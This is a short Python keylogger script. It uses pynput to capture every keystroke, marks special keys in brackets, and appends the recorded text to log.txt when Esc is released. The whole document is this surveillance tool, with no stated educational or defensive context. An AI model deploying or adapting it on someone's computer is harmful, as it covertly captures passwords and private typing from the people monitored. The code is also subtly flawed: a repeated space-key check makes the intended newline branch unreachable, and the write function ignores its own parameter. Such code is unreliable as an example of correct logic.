import pynput.keyboard
log= " "
def on_press(key):
    global log
    try:
        log=log+key.char
    except AttributeError:
        if key==pynput.keyboard.Key.space:
            log=log+ " "
        elif key==pynput.keyboard.Key.space:
            log=log+ "\n"
        else:
            log=log+ "["+ str(key)+"]"
def on_release(key):
    if key==pynput.keyboard.Key.esc:
        write_log(log)
        return False
def write_log(kig):
    with open("log.txt","a") as f:
        f.write(log)
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as Listener:
    Listener.join()